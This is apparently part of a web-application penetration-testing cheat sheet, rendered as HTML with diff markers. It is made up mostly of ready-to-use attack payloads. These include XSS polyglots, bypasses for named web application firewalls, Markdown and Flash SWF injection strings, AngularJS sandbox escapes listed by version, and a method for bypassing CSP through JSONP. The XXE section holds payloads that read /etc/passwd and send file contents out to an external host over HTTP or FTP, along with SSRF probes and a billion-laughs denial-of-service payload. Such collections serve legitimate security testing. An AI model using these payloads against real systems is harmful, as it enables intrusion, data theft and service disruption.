+<p><strong>XSS Polyglot</strong> by <a href="https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot" target="_blank" rel="noopener">Ahmed Elsobky</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jaVasCript:/*-/*`/*\`/*&apos;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span><br></pre></td></tr></table></figure>
+<p><strong>Kona WAF (Akamai) Bypass</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\');confirm(1);//</span><br></pre></td></tr></table></figure>
+<p><strong>ModSecurity WAF Bypass</strong><br>Note: This kind of depends on what security level the application is set to. See: <a href="https://modsecurity.org/rules.html" target="_blank" rel="noopener">https://modsecurity.org/rules.html</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">prompt(document.domain)</span> <span class="attr">onerror</span>=<span class="string">prompt(document.domain)</span> <span class="attr">onerror</span>=<span class="string">prompt(document.domain)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Wordfence XSS Bypasses</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmouseover</span>=<span class="string">"alert(1)"</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'"&gt;&gt;&lt;div&gt;&lt;meter onmouseover="alert(1)"&lt;/div&gt;"</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;<span class="tag">&lt;<span class="name">marquee</span> <span class="attr">loop</span>=<span class="string">1</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">onfinish</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Incapsula WAF Bypasses</strong> by <a href="https://twitter.com/i_bo0om" target="_blank" rel="noopener">@i_bo0om</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">'this["src"]="javas&amp;Tab;cript:al"+"ert``"'</span>;&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">q</span> <span class="attr">onerror</span>=<span class="string">'new Function`al\ert\`1\``'</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>jQuery &lt; 3.0.0 XSS</strong><br> by <a href="https://github.com/jquery/jquery/issues/2432" target="_blank" rel="noopener">Egor Homakov</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="keyword">get</span>('http://sakurity.com/jqueryxss')</span><br></pre></td></tr></table></figure>
+<p>In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:</p>
+<p>1) Find any cross domain requests to untrusted domains which may inadvertently execute script.<br>2) Find any requests to trusted API endpoints where script can be injected into data sources.</p>
+<p><strong>URL verification bypasses (works without <code>&amp;#x09;</code> too)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#x09;cript://www.google.com/%0Aalert(1)</span><br></pre></td></tr></table></figure>
+<p><strong>Markdown XSS</strong></p>
+<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">a</span>](<span class="link">javascript:confirm(1</span>))</span><br></pre></td></tr></table></figure>
+<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">a</span>](<span class="link">javascript://www.google.com%0Aprompt(1</span>))</span><br></pre></td></tr></table></figure>
+<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">a</span>](<span class="link">javascript://%0d%0aconfirm(1</span>))</span><br></pre></td></tr></table></figure>
+<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">a</span>](<span class="link">javascript://%0d%0aconfirm(1</span>);com)</span><br></pre></td></tr></table></figure>
+<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">a</span>](<span class="link">javascript:window.onerror=confirm;throw%201</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">a</span>]: <span class="link">(javascript:prompt(1))</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">a</span>]:<span class="link">(javascript:alert(1))           //Add SOH Character</span></span><br></pre></td></tr></table></figure>
+<p><strong>Flash SWF XSS</strong></p>
+<ul>
+<li>ZeroClipboard: <code>ZeroClipboard.swf?id=\&quot;))}catch(e){confirm(/XSS./.source);}//&amp;width=500&amp;height=500&amp;.swf</code></li>
+<li>plUpload Player: <code>plupload.flash.swf?%#target%g=alert&amp;uid%g=XSS&amp;</code></li>
+<li>plUpload MoxiePlayer: <code>Moxie.swf?target%g=confirm&amp;uid%g=XSS</code> (also works with <code>Moxie.cdn.swf</code> and other variants)</li>
+<li>FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert<code>1</code></code></li>
+<li>videoJS: <code>video-js.swf?readyFunction=confirm</code> and <code>video-js.swf?readyFunction=alert%28document.domain%2b&#39;%20XSS&#39;%29</code></li>
+<li>YUI “io.swf”: <code>io.swf?yid=\&quot;));}catch(e){alert(document.domain);}//</code></li>
+<li>YUI “uploader.swf”: <code>uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//&lt;</code></li>
+<li>Open Flash Chart: <code>open-flash-chart.swf?get-data=(function(){alert(1)})()</code></li>
+<li>AutoDemo: <code>control.swf?onend=javascript:alert(1)//</code></li>
+<li>Adobe FLV Progressive: <code>/main.swf?baseurl=asfunction:getURL,javascript:alert(1)//</code> and <code>/FLVPlayer_Progressive.swf?skinName=asfunction:getURL,javascript:alert(1)//</code></li>
+<li>Banner.swf (generic): <code>banner.swf?clickTAG=javascript:alert(document.domain);//</code></li>
+<li>JWPlayer (legacy): <code>player.swf?playerready=alert(document.domain)</code> and <code>/player.swf?tracecall=alert(document.domain)</code></li>
+<li>SWFUpload 2.2.0.1: <code>swfupload.swf?movieName=&quot;]);}catch(e){}if(!self.a)self.a=!confirm(1);//</code></li>
+<li>Uploadify (legacy): <code>uploadify.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;confirm(%27XSS%27)}}//&amp;.swf</code></li>
+<li>FlowPlayer 3.2.7: <code>flowplayer-3.2.7.swf?config={&quot;clip&quot;:{&quot;url&quot;:&quot;http://edge.flowplayer.org/bauhaus.mp4&quot;,&quot;linkUrl&quot;:&quot;JavaScriPt:confirm(document.domain)&quot;}}&amp;.swf</code></li>
+</ul>
+<p><em>Note: Useful reference on constructing Flash-based XSS payloads available at <a href="https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/" target="_blank" rel="noopener">MWR Labs</a>.</em></p>
+<p><strong>Lightweight Markup Languages</strong></p>
+<p><strong>RubyDoc</strong> (.rdoc)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XSS[JavaScript:alert(1)]</span><br></pre></td></tr></table></figure>
+<p><strong>Textile</strong> (<a href="https://txstyle.org/" target="_blank" rel="noopener">.textile</a>)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Test link&quot;:javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<p><strong>reStructuredText</strong> (<a href="http://docutils.sourceforge.net/docs/user/rst/quickref.html" target="_blank" rel="noopener">.rst</a>)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`Test link`__.</span><br><span class="line"></span><br><span class="line">__ javascript:alert(document.domain)</span><br></pre></td></tr></table></figure>
+<p><strong>Unicode characters</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">†‡•＜img src=a onerror=javascript:alert('test')&gt;…‰€</span><br></pre></td></tr></table></figure>
+<p><strong>AngularJS Template Injection based XSS</strong></p>
+<p><em>For manual verification on a live target, use <code>angular.version</code> in your browser console</em></p>
+<p><strong>1.0.1 - 1.1.5</strong> by <a href="https://twitter.com/0x6D6172696F" target="_blank" rel="noopener">Mario Heiderich (Cure53)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="keyword">constructor</span>.<span class="keyword">constructor</span>('alert(1)')()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.2.0 - 1.2.1</strong> by <a href="https://twitter.com/tehjh" target="_blank" rel="noopener">Jan Horn (Google)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a=<span class="string">'constructor'</span>;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,<span class="number">0</span>,<span class="string">'alert(1)'</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.2.2 - 1.2.5</strong> by <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes (PortSwigger)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'a'</span>[&#123;<span class="attr">toString</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">'__proto__'</span>&#125;].charAt=<span class="string">''</span>.valueOf;$<span class="built_in">eval</span>(<span class="string">"x='"</span>+(y=<span class="string">'if(!window\\u002ex)alert(window\\u002ex=1)'</span>)+<span class="built_in">eval</span>(y)+<span class="string">"'"</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.2.6 - 1.2.18</strong> by <a href="https://twitter.com/tehjh" target="_blank" rel="noopener">Jan Horn (Google)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(_=<span class="string">''</span>.sub).call.call(&#123;&#125;[$=<span class="string">'constructor'</span>].getOwnPropertyDescriptor(_.__proto__,$).value,<span class="number">0</span>,<span class="string">'alert(1)'</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.2.19 - 1.2.23</strong> by <a href="https://twitter.com/avlidienbrunn" target="_blank" rel="noopener">Mathias Karlsson</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;toString.constructor.prototype.toString=toString.constructor.prototype.call;[<span class="string">"a"</span>,<span class="string">"alert(1)"</span>].sort(toString.constructor);&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.2.24 - 1.2.29</strong> by <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes (PortSwigger)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'a'</span>.constructor.prototype.charAt=<span class="string">''</span>.valueOf;$<span class="built_in">eval</span>(<span class="string">"x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'"</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.3.0</strong> by <a href="https://twitter.com/molnar_g" target="_blank" rel="noopener">Gábor Molnár (Google)</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;!ready &amp;&amp; (ready = true) &amp;&amp; (</span><br><span class="line">      !call</span><br><span class="line">      ? $$watchers[0].get(toString.constructor.prototype)</span><br><span class="line">      : (a = apply) &amp;&amp;</span><br><span class="line">        (apply = constructor) &amp;&amp;</span><br><span class="line">        (valueOf = call) &amp;&amp;</span><br><span class="line">        (&apos;&apos;+&apos;&apos;.toString(</span><br><span class="line">          &apos;F = Function.prototype;&apos; +</span><br><span class="line">          &apos;F.apply = F.a;&apos; +</span><br><span class="line">          &apos;delete F.a;&apos; +</span><br><span class="line">          &apos;delete F.valueOf;&apos; +</span><br><span class="line">          &apos;alert(1);&apos;</span><br><span class="line">        ))</span><br><span class="line">    );&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.3.1 - 1.3.2</strong> by <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes (PortSwigger)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    &#123;&#125;[&#123;<span class="attr">toString</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">'__proto__'</span>&#125;].assign=[].join;</span><br><span class="line">    <span class="string">'a'</span>.constructor.prototype.charAt=<span class="string">''</span>.valueOf; </span><br><span class="line">    $<span class="built_in">eval</span>(<span class="string">'x=alert(1)//'</span>); </span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.3.3 - 1.3.18</strong> by <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes (PortSwigger)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;[&#123;<span class="attr">toString</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">'__proto__'</span>&#125;].assign=[].join; </span><br><span class="line"></span><br><span class="line">  <span class="string">'a'</span>.constructor.prototype.charAt=[].join;</span><br><span class="line">  $<span class="built_in">eval</span>(<span class="string">'x=alert(1)//'</span>);  &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.3.19</strong> by <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes (PortSwigger)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    <span class="string">'a'</span>[&#123;<span class="attr">toString</span>:<span class="literal">false</span>,<span class="attr">valueOf</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">'__proto__'</span>&#125;].charAt=[].join; </span><br><span class="line">    $<span class="built_in">eval</span>(<span class="string">'x=alert(1)//'</span>); </span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.3.20</strong> by <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes (PortSwigger)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'a'</span>.constructor.prototype.charAt=[].join;$<span class="built_in">eval</span>(<span class="string">'x=alert(1)'</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.4.0 - 1.4.9</strong> by <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes (PortSwigger)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'a'</span>.constructor.prototype.charAt=[].join;$<span class="built_in">eval</span>(<span class="string">'x=1&#125; &#125; &#125;;alert(1)//'</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.5.0 - 1.5.8</strong> by <a href="https://twitter.com/ianhickey1024" target="_blank" rel="noopener">Ian Hickey</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;x = &#123;<span class="string">'y'</span>:<span class="string">''</span>.constructor.prototype&#125;; x[<span class="string">'y'</span>].charAt=[].join;$<span class="built_in">eval</span>(<span class="string">'x=alert(1)'</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.5.9 - 1.5.11</strong> by <a href="https://twitter.com/tehjh" target="_blank" rel="noopener">Jan Horn (Google)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    c=<span class="string">''</span>.sub.call;b=<span class="string">''</span>.sub.bind;a=<span class="string">''</span>.sub.apply;</span><br><span class="line">    c.$apply=$apply;c.$<span class="built_in">eval</span>=b;op=$root.$$phase;</span><br><span class="line">    $root.$$phase=<span class="literal">null</span>;od=$root.$digest;$root.$digest=(&#123;&#125;).toString;</span><br><span class="line">    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;</span><br><span class="line">    B=C(b,c,b);$evalAsync(<span class="string">"</span></span><br><span class="line"><span class="string">    astNode=pop();astNode.type='UnaryExpression';</span></span><br><span class="line"><span class="string">    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';</span></span><br><span class="line"><span class="string">    astNode.argument=&#123;type:'Identifier',name:'foo'&#125;;</span></span><br><span class="line"><span class="string">    "</span>);</span><br><span class="line">    m1=B($$asyncQueue.pop().expression,<span class="literal">null</span>,$root);</span><br><span class="line">    m2=B(C,<span class="literal">null</span>,m1);[].push.apply=m2;a=<span class="string">''</span>.sub;</span><br><span class="line">    $<span class="built_in">eval</span>(<span class="string">'a(b.c)'</span>);[].push.apply=a;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>1.6.0+</strong> (no <a href="http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html" target="_blank" rel="noopener">Expression Sandbox</a>) by <a href="https://twitter.com/0x6D6172696F" target="_blank" rel="noopener">Mario Heiderich (Cure53)</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="keyword">constructor</span>.<span class="keyword">constructor</span>('alert(1)')()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>Content Security Policy (CSP) bypass via JSONP endpoints</strong></p>
+<p>Grab the target’s CSP:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http:<span class="comment">//example.com | grep 'Content-Security-Policy'</span></span><br></pre></td></tr></table></figure>
+<p>Either paste the CSP into <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> or just submit the target’s address into the “Content Security Policy” field. The CSP Evaluator will notify you if one of the whitelisted domains has JSONP endpoints.</p>
+<p><img src="https://user-images.githubusercontent.com/18099289/32136707-a1c12510-bc12-11e7-8a80-8a22b3e94232.png" alt="image"></p>
+<p>Now we can use a Google dork to find some JSONP endpoints on the domains listed above.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:example.com inurl:callback</span><br></pre></td></tr></table></figure>
+<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><strong>LFI Test</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">&lt;!ELEMENT foo (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>Blind LFI test (when first case doesn’t return anything)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY blind SYSTEM &quot;https://www.example.com/?%xxe;&quot;&gt;]&gt;&lt;foo&gt;&amp;blind;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>Access Control bypass (loading restricted resources - PHP example)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY ac SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;&lt;result&gt;&amp;ac;&lt;/result&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>SSRF Test</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">&lt;!ELEMENT foo (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;https://www.example.com/text.txt&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>XEE (XML Entity Expansion - DOS)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>XEE #2 (Remote attack - through external xml inclusion)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;https://example.com/entity1.xml&quot;&gt;]&gt;</span><br><span class="line">&lt;lolz&gt;&lt;lol&gt;3..2..1...&amp;test&lt;lol&gt;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>XXE FTP HTTP Server</strong></p>
+<p><a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb" target="_blank" rel="noopener">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a></p>
+<p><a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" target="_blank" rel="noopener">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://publicServer.com/parameterEntity_sendftp.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br><span class="line"></span><br><span class="line">File stored on http://publicServer.com/parameterEntity_sendftp.dtd</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;ftp://publicServer.com/%payload;&apos;&gt;&quot;&gt;</span><br><span class="line">%param1;</span><br></pre></td></tr></table></figure>
+<p><strong>XXE UTF-7</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span><br><span class="line">+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4</span><br><span class="line">+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+</span><br><span class="line">+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4</span><br></pre></td></tr></table></figure>
+<p>To convert between UTF-8 &amp; UTF-7 use recode.<br><code>recode UTF8..UTF7 payload-file.xml</code></p>
